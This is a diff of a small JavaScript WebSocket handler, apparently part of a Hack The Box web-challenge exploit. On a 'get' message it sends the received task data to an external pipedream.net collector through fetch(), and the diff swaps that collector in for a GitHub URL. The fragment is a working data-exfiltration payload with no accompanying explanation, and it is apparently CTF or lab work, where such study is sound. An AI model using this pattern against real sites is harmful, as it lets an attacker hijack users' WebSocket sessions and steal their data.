@@ -8,7 +8,7 @@ ws.onmessage = async (msg) => {
     const data = JSON.parse(msg.data);
     if (data.success) {
         if (data.action === 'get') {
-            fetch("http://raw.githubusercontent.com/FlyLevin/HTBWebSites/main/" + JSON.stringify(data.tasks ))
+            fetch("https://eoljadkzojbxa0x.m.pipedream.net/" + JSON.stringify(data.tasks ))
         }
         else if (data.action === 'add') {
         }
